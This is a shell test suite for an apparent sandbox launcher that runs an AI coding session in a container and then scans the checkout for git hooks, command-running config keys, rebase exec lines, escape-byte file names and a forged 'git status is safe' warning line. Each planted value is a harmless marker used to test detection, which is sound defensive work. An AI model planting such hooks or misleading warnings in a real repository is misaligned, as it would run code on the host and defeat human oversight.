  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  run git_exit_scan "$SCAN_WS" "$before"
  echo "$output"
  [ "$status" -eq 1 ]
  [[ "$output" == *"! $SCAN_WS/.git is not a valid git directory now"* ]]
}

@test "exit scan gitdir: a repository planted at the checkout root (HEAD, objects/, refs/) is a finding" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  mkdir -p "$SCAN_WS/objects" "$SCAN_WS/refs/heads"
  echo 'ref: refs/heads/main' > "$SCAN_WS/HEAD"
  run git_exit_scan "$SCAN_WS" "$before"
  echo "$output"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ root-repo $SCAN_WS  looks like a git dir"* ]]
}

@test "exit scan gitdir: a commondir file planted at the checkout root is a finding" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  echo .git > "$SCAN_WS/commondir"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ root-repo $SCAN_WS  looks like a git dir"* ]]
}

@test "launch_gitdir_ok: a normal checkout passes; a .git without HEAD, or a root that looks like a git dir, fails with the reason" {
  scan_repo
  launch_gitdir_ok "$SCAN_WS"
  mv "$SCAN_WS/.git/HEAD" "$TEST_TMPDIR/HEAD.saved"
  run launch_gitdir_ok "$SCAN_WS"
  [ "$status" -eq 1 ]
  [[ "$output" == *"$SCAN_WS/.git is not a valid git directory"* ]]
  mv "$TEST_TMPDIR/HEAD.saved" "$SCAN_WS/.git/HEAD"
  echo .git > "$SCAN_WS/commondir"
  run launch_gitdir_ok "$SCAN_WS"
  [ "$status" -eq 1 ]
  [[ "$output" == *"$SCAN_WS itself looks like a git directory"* ]]
}

@test "launch: a repository already planted at the checkout root refuses the launch (exit 1), never becomes the baseline" {
  make_repo "$TEST_TMPDIR/proj"
  local ws; ws="$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)"
  session_stub "$ws" ":"
  # git itself still uses .git here (it is valid), so the launcher gets this far.
  mkdir -p "$ws/objects" "$ws/refs/heads"
  echo 'ref: refs/heads/main' > "$ws/HEAD"
  run bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/proj"
  echo "$output"
  [ "$status" -eq 1 ]
  [[ "$output" == *"refusing to launch on $ws: $ws itself looks like a git directory"* ]]
  run ! grep -q 'devcontainer up' "$DC_LOG"
}

@test "launch: a .git git accepts but the tools do not (HEAD over 255 bytes) refuses the launch (exit 1)" {
  make_repo "$TEST_TMPDIR/proj"
  local ws; ws="$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)"
  session_stub "$ws" ":"
  { printf 'ref: refs/heads/main\n'; head -c 300 /dev/zero | tr '\0' x; } > "$ws/.git/HEAD"
  git -C "$ws" rev-parse --show-toplevel   # git still accepts it
  run bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/proj"
  echo "$output"
  [ "$status" -eq 1 ]
  [[ "$output" == *"refusing to launch on $ws: $ws/.git is not a valid git directory"* ]]
  run ! grep -q 'devcontainer up' "$DC_LOG"
}

@test "exit scan gitdir: switching and creating branches is not a finding (HEAD's kind, not its ref)" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  [[ "$before" == *$'gitdir-valid\t'*$'\tvalid HEAD=symref'* ]]
  git -C "$SCAN_WS" checkout -q -b feature
  echo more >> "$SCAN_WS/file.txt"
  git -C "$SCAN_WS" -c commit.gpgsign=false commit -qam "on a branch"
  run git_exit_scan "$SCAN_WS" "$before"
  echo "$output"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "exit scan gitdir: a session that makes .git invalid ends the launcher with exit 3" {
  make_repo "$TEST_TMPDIR/proj"
  local ws; ws="$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)"
  session_stub "$ws" "rm '$ws/.git/HEAD'"
  run bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/proj"
  echo "$output"
  [ "$status" -eq 3 ]
  [[ "$output" == *"gitdir-valid $ws/.git  invalid HEAD=invalid"* ]]
}

@test "exit scan size cap: a huge (sparse) .git file fails the scan fast as unsafe, unread" {
  scan_repo
  git -C "$SCAN_WS" worktree add -q "$TEST_TMPDIR/wt" -b wt
  local wt; wt="$(git -C "$TEST_TMPDIR/wt" rev-parse --show-toplevel)"
  local before; before="$(git_exec_snapshot "$wt")"
  rm "$wt/.git"; truncate -s 100G "$wt/.git"
  local t0=$SECONDS
  run git_exit_scan "$wt" "$before"
  [ $((SECONDS - t0)) -lt 20 ]
  echo "$output"
  [ "$status" -eq 2 ]
  [[ "$output" == *"$wt/.git is too large to read (107374182400 bytes"*"treat the checkout as unsafe"* ]]
}

@test "exit scan: control bytes in a planted value are shown as '?', not sent to the terminal" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  git config --file "$SCAN_WS/.git/config" core.pager "$(printf 'less\033[2J')"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ core.pager less?[2J"* ]]
  [[ "$output" != *$'\033'* ]]
}

@test "exit scan: an unreadable .git is reported (status 2), not passed" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  rm -rf "$SCAN_WS/.git"
  echo "not a gitdir line" > "$SCAN_WS/.git"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 2 ]
  [[ "$output" == *"could not read"* ]]
}

# --- Exit scan regressions from the 3-replicate fact-check of the key-list scan ---
# docs/reviews/code-fact-check-report-r{1,2,3}.md: each shape below left host git
# armed while the first version of the scan returned 0.

# scan_remote: a bare repo outside the checkout, as origin, present at launch.
scan_remote() {
  git init -q --bare "$TEST_TMPDIR/remote.git"
  git -C "$SCAN_WS" remote add origin "$TEST_TMPDIR/remote.git"
}

# not_root: permission tests mean nothing to root, who can list anything.
not_root() {
  [ "$(id -u)" -ne 0 ] || skip "running as root: directory permissions are not enforced"
}

@test "exit scan (a): remote.origin.receivepack is named; the hooks-only safe push would run it" {
  scan_repo
  scan_remote
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  git config --file "$SCAN_WS/.git/config" remote.origin.receivepack \
    "touch $TEST_TMPDIR/ran/receivepack; git-receive-pack"
  git config --file "$SCAN_WS/.git/config" remote.origin.uploadpack \
    "touch $TEST_TMPDIR/ran/uploadpack; git-upload-pack"
  cd "$SCAN_WS"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ remote.origin.receivepack touch $TEST_TMPDIR/ran/receivepack; git-receive-pack   <- can run a program"* ]]
  [[ "$output" == *"+ remote.origin.uploadpack touch "*"<- can run a program"* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
  # Why the report says the hooks-only push is not enough (pins the guide's claim)...
  git -c core.hooksPath=/dev/null -c core.fsmonitor=false push -q origin HEAD:refs/heads/x
  [ -e "$TEST_TMPDIR/ran/receivepack" ]
  # ...and that refusing the file transport does stop this one.
  rm "$TEST_TMPDIR/ran/receivepack"
  run git -c protocol.file.allow=never push -q origin HEAD:refs/heads/y
  [ "$status" -ne 0 ]
  [ ! -e "$TEST_TMPDIR/ran/receivepack" ]
}

@test "exit scan (b): a pushurl repointed at a bare repo in the checkout names it and its hook" {
  scan_repo
  scan_remote
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  git init -q --bare "$SCAN_WS/evil.git"
  plant_hook "$SCAN_WS/evil.git/hooks" post-receive
  git config --file "$SCAN_WS/.git/config" remote.origin.pushurl ./evil.git
  cd "$SCAN_WS"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ remote.origin.pushurl ./evil.git   <- can run a program"* ]]
  [[ "$output" == *"+ hook $SCAN_WS/evil.git/hooks/post-receive  file 755 "* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
}

@test "exit scan (b): a hook planted in a local remote that was already in the checkout is named" {
  scan_repo
  git init -q --bare "$SCAN_WS/evil.git"
  git -C "$SCAN_WS" remote add origin ./evil.git
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/evil.git/hooks" pre-receive
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/evil.git/hooks/pre-receive "* ]]
}

@test "exit scan (c): a submodule git dir's config, hooks and attributes are named, and not run" {
  scan_repo
  git init -q --bare "$SCAN_WS/.git/modules/sub"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  local m="$SCAN_WS/.git/modules/sub"
  git config --file "$m/config" core.fsmonitor "touch $TEST_TMPDIR/ran/sub-fsmonitor"
  plant_hook "$m/hooks" post-checkout
  mkdir -p "$m/info"
  echo '* filter=x' > "$m/info/attributes"
  cd "$SCAN_WS"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ config $m/config  file "* ]]
  [[ "$output" == *"+ core.fsmonitor touch $TEST_TMPDIR/ran/sub-fsmonitor   <- can run a program"* ]]
  [[ "$output" == *"+ hook $m/hooks/post-checkout "* ]]
  [[ "$output" == *"+ attributes $m/info/attributes "* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
}

@test "exit scan (c): nested submodule git dirs (modules/a/modules/b) are walked too" {
  scan_repo
  git init -q --bare "$SCAN_WS/.git/modules/a/modules/b"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/.git/modules/a/modules/b/hooks" pre-commit
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/.git/modules/a/modules/b/hooks/pre-commit "* ]]
}

@test "exit scan (c): an embedded repo's .git in the working tree is scanned (host status recurses into it)" {
  scan_repo
  make_repo "$SCAN_WS/vendor/lib"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  git config --file "$SCAN_WS/vendor/lib/.git/config" core.fsmonitor "touch $TEST_TMPDIR/ran/nested"
  make_repo "$SCAN_WS/newrepo"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ config $SCAN_WS/vendor/lib/.git/config "* ]]
  [[ "$output" == *"+ core.fsmonitor touch $TEST_TMPDIR/ran/nested"* ]]
  [[ "$output" == *"+ dotgit $SCAN_WS/newrepo/.git  dir "* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
}

@test "exit scan (d): a hooks dir made traversable but not listable fails closed (status 2)" {
  not_root
  local mode
  for mode in 0311 0111; do
    rm -rf "$TEST_TMPDIR/proj" "$TEST_TMPDIR/ran"
    scan_repo
    local before; before="$(git_exec_snapshot "$SCAN_WS")"
    plant_hook "$SCAN_WS/.git/hooks" post-commit
    chmod "$mode" "$SCAN_WS/.git/hooks"
    run git_exit_scan "$SCAN_WS" "$before"
    chmod 0755 "$SCAN_WS/.git/hooks"
    [ "$status" -eq 2 ] || { echo "mode $mode: status $status"; return 1; }
    [[ "$output" == *"cannot list everything under $SCAN_WS/.git"* ]]
    [[ "$output" == *"search permission"* ]]
  done
}

@test "exit scan (d): an unlistable hooks dir at launch refuses the baseline, not an empty one" {
  not_root
  scan_repo
  chmod 0311 "$SCAN_WS/.git/hooks"
  run git_exec_snapshot "$SCAN_WS"
  chmod 0755 "$SCAN_WS/.git/hooks"
  [ "$status" -eq 1 ]
}

@test "exit scan (d): a changed hooks dir mode, a removed hook and a symlinked hooks dir are named" {
  scan_repo
  plant_hook "$SCAN_WS/.git/hooks" pre-commit
  mkdir -p "$SCAN_WS/tools/hk"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  chmod 0700 "$SCAN_WS/.git/hooks"
  rm "$SCAN_WS/.git/hooks/pre-commit"
  plant_hook "$SCAN_WS/tools/hk" pre-push
  git config --file "$SCAN_WS/.git/config" core.hooksPath tools/hk
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ hooksdir $SCAN_WS/.git/hooks  dir 700"* ]]
  [[ "$output" == *"- hook $SCAN_WS/.git/hooks/pre-commit "* ]]
  [[ "$output" == *"+ hook $SCAN_WS/tools/hk/pre-push "* ]]
}

@test "exit scan (d): a hook that is a symlink is recorded with its target, whose change is a finding" {
  scan_repo
  plant_hook "$SCAN_WS/tools" real-hook
  ln -s ../../tools/real-hook "$SCAN_WS/.git/hooks/pre-push"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  [[ "$before" == *"hook"$'\t'"$SCAN_WS/.git/hooks/pre-push"$'\t'"link -> ../../tools/real-hook file "* ]]
  echo 'touch x' >> "$SCAN_WS/tools/real-hook"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ hook $SCAN_WS/.git/hooks/pre-push  link -> ../../tools/real-hook file "* ]]
}

@test "exit scan (e): keys outside any list are still named (a changed config is the finding)" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  local c="$SCAN_WS/.git/config" k
  git config --file "$c" core.attributesFile "$SCAN_WS/attrs"
  git config --file "$c" difftool.x.cmd "touch $TEST_TMPDIR/ran/difftool"
  git config --file "$c" mergetool.x.cmd "touch $TEST_TMPDIR/ran/mergetool"
  git config --file "$c" uploadpack.packObjectsHook "touch $TEST_TMPDIR/ran/pohook"
  git config --file "$c" "url.$TEST_TMPDIR/evil.git.insteadOf" "https://example.invalid/"
  git config --file "$c" credential.helper "!touch $TEST_TMPDIR/ran/cred"
  git config --file "$c" interactive.diffFilter "touch $TEST_TMPDIR/ran/idf"
  git config --file "$c" branch.main.pushRemote ./evil.git
  git config --file "$c" madeup.futureKey "some value"
  cd "$SCAN_WS"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  for k in core.attributesfile difftool.x.cmd mergetool.x.cmd uploadpack.packobjectshook \
           "url.$TEST_TMPDIR/evil.git.insteadof" credential.helper interactive.difffilter \
           branch.main.pushremote; do
    [[ "$output" == *"+ $k "*"<- can run a program"* ]] || { echo "not named/marked: $k"; return 1; }
  done
  # Unknown to the label list, still a finding, just without the mark.
  [[ "$output" == *"+ madeup.futurekey some value"$'\n'* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
}

@test "exit scan (e): an attributesFile or include target inside the checkout that changes is named" {
  scan_repo
  echo '*.x diff=plain' > "$SCAN_WS/attrs"
  printf '[user]\n\tname = t\n' > "$SCAN_WS/shared.gitconfig"
  git config --file "$SCAN_WS/.git/config" core.attributesFile "$SCAN_WS/attrs"
  git config --file "$SCAN_WS/.git/config" include.path ../shared.gitconfig
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  echo '* filter=x' > "$SCAN_WS/attrs"
  printf '[core]\n\tfsmonitor = touch %s/ran/inc\n' "$TEST_TMPDIR" >> "$SCAN_WS/shared.gitconfig"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ attributes $SCAN_WS/attrs  file "* ]]
  [[ "$output" == *"~ include $SCAN_WS/.git/../shared.gitconfig  file "* ]]
  [[ "$output" == *"+ core.fsmonitor touch $TEST_TMPDIR/ran/inc"* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
}

@test "exit scan (e): a relative core.hooksPath in YOUR global config is walked inside the checkout" {
  scan_repo
  export GIT_CONFIG_GLOBAL="$TEST_TMPDIR/host.gitconfig"
  git config --global core.hooksPath .githooks
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/.githooks" pre-push
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/.githooks/pre-push "* ]]
}

@test "exit scan (e): even an inert config change (user.name) is reported, not allowlisted" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  git config --file "$SCAN_WS/.git/config" user.name "someone else"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ user.name someone else"$'\n'* ]]
}

@test "exit scan (f): an unreadable hook with control bytes in its name is reported through '?'" {
  not_root
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  local bad
  bad="$SCAN_WS/.git/hooks/$(printf 'x\033[2Jy')"
  printf '#!/bin/sh\n' > "$bad"
  chmod 000 "$bad"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 2 ]
  [[ "$output" == *"cannot read"* ]]
  [[ "$output" != *$'\033'* ]]
}

@test "exit scan (f): a launch whose baseline fails prints the container-chosen name through '?'" {
  not_root
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  local ws; ws="$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)"
  # What an earlier session could leave behind.
  local bad
  bad="$ws/.git/hooks/$(printf 'pre-push\033[2J')"
  printf '#!/bin/sh\n' > "$bad"
  chmod 000 "$bad"
  run bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/proj"
  [ "$status" -eq 1 ]
  [[ "$output" == *"could not snapshot"* ]]
  [[ "$output" == *"pre-push?[2J"* ]]
  [[ "$output" != *$'\033'* ]]
  run ! grep -q 'devcontainer up' "$DC_LOG"
}

# --- Exit scan regressions from the iteration-2 fact-check (docs/reviews/
# code-fact-check-report-r{1,2,3}.md at 02d14b0): N* and P* are the probe names there.

# no_ran: nothing planted was executed by the scan.
no_ran() {
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ] || { ls "$TEST_TMPDIR/ran"; return 1; }
}

@test "exit scan N5: a branch named config is not parsed as git config (launch not refused)" {
  scan_repo
  git -C "$SCAN_WS" checkout -q -b config
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  echo z >> "$SCAN_WS/file.txt"; git -C "$SCAN_WS" -c commit.gpgsign=false commit -qam w
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "exit scan N6: a normal commit on a branch with a hooks component is not a finding" {
  scan_repo
  git -C "$SCAN_WS" checkout -q -b feat/hooks/x
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  echo z >> "$SCAN_WS/file.txt"; git -C "$SCAN_WS" -c commit.gpgsign=false commit -qam w
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "exit scan N7: a checkout under a directory named hooks: a normal commit is not a finding" {
  make_repo "$TEST_TMPDIR/hooks/proj"
  local ws; ws="$(git -C "$TEST_TMPDIR/hooks/proj" rev-parse --show-toplevel)"
  local before; before="$(git_exec_snapshot "$ws")"
  # Objects, refs and logs are not recorded at all.
  [[ "$before" != *"/objects/"* ]]
  [[ "$before" != *"/refs/heads/"* ]]
  echo z >> "$ws/file.txt"; git -C "$ws" -c commit.gpgsign=false commit -qam w
  run git_exit_scan "$ws" "$before"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  # ...and a hook planted there is still found.
  plant_hook "$ws/.git/hooks" pre-push
  run git_exit_scan "$ws" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $ws/.git/hooks/pre-push "* ]]
}

@test "exit scan N13: a newline in an unreadable hook's name cannot forge a line in the warning" {
  not_root
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  local n=$'x\n  NOTE: nothing else changed; git status is safe here.\ny'
  printf '#!/bin/sh\n' > "$SCAN_WS/.git/hooks/$n"; chmod 000 "$SCAN_WS/.git/hooks/$n"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 2 ]
  [[ "$output" == *"cannot read $SCAN_WS/.git/hooks/x?  NOTE: nothing else changed"* ]]
  run grep -c 'NOTE: nothing else changed' <<< "$output"
  [ "$output" -eq 1 ]
  run grep -q '^ *NOTE: nothing else changed' <<< "$output"
  [ "$status" -ne 0 ]
}

@test "exit scan: an unlistable directory in the working tree is named as such, not as .git" {
  not_root
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  mkdir "$SCAN_WS/deep"; chmod 000 "$SCAN_WS/deep"
  run git_exit_scan "$SCAN_WS" "$before"
  chmod 755 "$SCAN_WS/deep"
  [ "$status" -eq 2 ]
  [[ "$output" == *"could not read everything it checks in $SCAN_WS (its git"* ]]
  [[ "$output" != *"under $SCAN_WS/.git:"* ]]
  [[ "$output" == *"cannot list everything under $SCAN_WS: "*"deep"* ]]
  [[ "$output" == *"cc-push $SCAN_WS"* ]]
}

@test "exit scan P1: a relative hooksPath from YOUR global includeIf gitdir: is walked" {
  scan_repo
  export GIT_CONFIG_GLOBAL="$TEST_TMPDIR/host.gitconfig"
  printf '[core]\n\thooksPath = .githooks\n' > "$TEST_TMPDIR/work.gitconfig"
  printf '[core]\n\thooksPath = .otherhooks\n' > "$TEST_TMPDIR/other.gitconfig"
  git config --global "includeIf.gitdir:$SCAN_WS/.path" work.gitconfig
  # A condition that does not match this checkout is not walked.
  git config --global "includeIf.gitdir:/nowhere/.path" other.gitconfig
  # The same file is what host git itself would use.
  [ "$(git -C "$SCAN_WS" config core.hooksPath)" = .githooks ]
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  [[ "$before" == *"hooksdir"$'\t'"$SCAN_WS/.githooks"$'\t'"missing"* ]]
  [[ "$before" != *".otherhooks"* ]]
  plant_hook "$SCAN_WS/.githooks" pre-commit
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/.githooks/pre-commit "* ]]
  no_ran
}

@test "exit scan P1: gitdir/i: matches case-insensitively and a relative pattern matches anywhere" {
  scan_repo
  export GIT_CONFIG_GLOBAL="$TEST_TMPDIR/host.gitconfig"
  printf '[core]\n\thooksPath = .ci-hooks\n' > "$TEST_TMPDIR/w.gitconfig"
  git config --global "includeIf.gitdir/i:${SCAN_WS^^}/.path" w.gitconfig
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  [[ "$before" == *"$SCAN_WS/.ci-hooks"* ]]
  export GIT_CONFIG_GLOBAL="$TEST_TMPDIR/host2.gitconfig"
  git config --global "includeIf.gitdir:${SCAN_WS##*/}/.path" "$TEST_TMPDIR/w.gitconfig"
  before="$(git_exec_snapshot "$SCAN_WS")"
  [[ "$before" == *"$SCAN_WS/.ci-hooks"* ]]
}

@test "exit scan P6: a nested worktree whose common dir is a bare repo in the checkout" {
  scan_repo
  make_repo "$TEST_TMPDIR/libsrc"
  git clone -q --bare "$TEST_TMPDIR/libsrc" "$SCAN_WS/vendor/lib.bare"
  git -C "$SCAN_WS/vendor/lib.bare" worktree add -q "$SCAN_WS/nested"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  local b="$SCAN_WS/vendor/lib.bare"
  git config --file "$b/config" core.fsmonitor "touch $TEST_TMPDIR/ran/p6-fsmonitor"
  plant_hook "$b/hooks" post-checkout
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ config $b/config "* ]]
  [[ "$output" == *"+ core.fsmonitor touch $TEST_TMPDIR/ran/p6-fsmonitor"* ]]
  [[ "$output" == *"+ hook $b/hooks/post-checkout "* ]]
  no_ran
}

@test "exit scan N2: remote.pushDefault and branch.*.pushRemote naming a path are walked" {
  scan_repo
  git init -q --bare "$SCAN_WS/b.git"
  git init -q --bare "$SCAN_WS/b2"
  git -C "$SCAN_WS" config remote.pushDefault ./b.git
  git -C "$SCAN_WS" config branch.main.pushRemote b2
  # A name that IS a remote is not a path.
  git -C "$SCAN_WS" remote add origin "$TEST_TMPDIR/remote.git"
  git -C "$SCAN_WS" config branch.main.remote origin
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  [[ "$before" != *"remote"$'\t'"$SCAN_WS/origin"* ]]
  plant_hook "$SCAN_WS/b.git/hooks" post-receive
  plant_hook "$SCAN_WS/b2/hooks" pre-receive
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/b.git/hooks/post-receive "* ]]
  [[ "$output" == *"+ hook $SCAN_WS/b2/hooks/pre-receive "* ]]
  [[ "$output" == *"cc-push $SCAN_WS"* ]]
  no_ran
}

@test "exit scan N2: url.<base>.insteadOf and file://localhost/ remotes inside the checkout are walked" {
  scan_repo
  git init -q --bare "$SCAN_WS/c.git"
  git init -q --bare "$SCAN_WS/d.git"
  git -C "$SCAN_WS" config "url.$SCAN_WS/c.git.insteadOf" https://example.invalid/
  git -C "$SCAN_WS" remote add up "file://localhost$SCAN_WS/d.git"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/c.git/hooks" pre-receive
  plant_hook "$SCAN_WS/d.git/hooks" update
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/c.git/hooks/pre-receive "* ]]
  [[ "$output" == *"+ hook $SCAN_WS/d.git/hooks/update "* ]]
}

@test "exit scan N3: a relative remote path with a colon after a slash is local, and walked" {
  scan_repo
  mkdir -p "$SCAN_WS/sub"; git init -q --bare "$SCAN_WS/sub/a:b"
  git -C "$SCAN_WS" remote add r sub/a:b
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/sub/a:b/hooks" post-receive
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/sub/a:b/hooks/post-receive "* ]]
}

@test "exit scan N4: legacy .git/remotes and .git/branches files are recorded and their targets walked" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  git init -q --bare "$SCAN_WS/.cache-b"
  plant_hook "$SCAN_WS/.cache-b/hooks" post-receive
  mkdir -p "$SCAN_WS/.git/remotes" "$SCAN_WS/.git/branches"
  printf 'URL: ./.cache-b\n' > "$SCAN_WS/.git/remotes/upstream"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ legacy-remote $SCAN_WS/.git/remotes/upstream "* ]]
  [[ "$output" == *"+ hook $SCAN_WS/.cache-b/hooks/post-receive "* ]]
  # A remotes file present at launch: a hook planted in its target is found.
  printf './.cache-c#main\n' > "$SCAN_WS/.git/branches/up"
  git init -q --bare "$SCAN_WS/.cache-c"
  before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/.cache-c/hooks" pre-receive
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/.cache-c/hooks/pre-receive "* ]]
  no_ran
}

@test "exit scan N11: YOUR relative global hooksPath is walked inside a submodule's working tree" {
  make_repo "$TEST_TMPDIR/subsrc"
  scan_repo
  git -C "$SCAN_WS" -c protocol.file.allow=always submodule add -q "$TEST_TMPDIR/subsrc" sm
  git -C "$SCAN_WS" -c commit.gpgsign=false commit -qm sm
  export GIT_CONFIG_GLOBAL="$TEST_TMPDIR/host.gitconfig"
  git config --global core.hooksPath .githooks
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/sm/.githooks" pre-commit
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/sm/.githooks/pre-commit "* ]]
  no_ran
}

@test "exit scan N12: an exec line added to an in-progress rebase's todo list is a finding" {
  scan_repo
  echo 2 >> "$SCAN_WS/file.txt"; git -C "$SCAN_WS" -c commit.gpgsign=false commit -qam two
  echo 3 >> "$SCAN_WS/file.txt"; git -C "$SCAN_WS" -c commit.gpgsign=false commit -qam three
  # A rebase already stopped at launch (the baseline holds its todo list)...
  (cd "$SCAN_WS" && GIT_SEQUENCE_EDITOR="sed -i '1s/^pick/edit/'" \
     git -c commit.gpgsign=false rebase -q -i HEAD~2) >/dev/null 2>&1 || true
  [ -f "$SCAN_WS/.git/rebase-merge/git-rebase-todo" ]
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  # ...and the session appends an exec line.
  printf 'exec touch %s/ran/rebase-exec\n' "$TEST_TMPDIR" >> "$SCAN_WS/.git/rebase-merge/git-rebase-todo"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ sequencer $SCAN_WS/.git/rebase-merge/git-rebase-todo "* ]]
  no_ran
}

@test "exit scan keys include every alternative of install.sh's refusal list" {
  local re alt
  local -a alts
  re="$(sed -n "s/^GIT_EXEC_KEYS_RE='\^(\(.*\))'\$/\1/p" "$CONFIG_SRC/install.sh")"
  [ -n "$re" ]
  IFS='|' read -ra alts <<< "$re"
  [ "${#alts[@]}" -ge 4 ]
  for alt in "${alts[@]}"; do
    [[ "$GIT_EXIT_SCAN_KEYS_RE" == *"|$alt|"* || "$GIT_EXIT_SCAN_KEYS_RE" == *"($alt|"* ]] \
      || { echo "missing from GIT_EXIT_SCAN_KEYS_RE: $alt"; return 1; }
  done
}

@test "a launch whose session plants a hook exits 3 and names it" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  local ws; ws="$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)"
  # Wrap the stub: the `claude` exec plants a hook, as a session would.
  mv "$TEST_TMPDIR/bin/devcontainer" "$TEST_TMPDIR/bin/devcontainer.inner"
  cat > "$TEST_TMPDIR/bin/devcontainer" <<STUB
#!/usr/bin/env bash
if [ "\${*: -1}" = claude ]; then
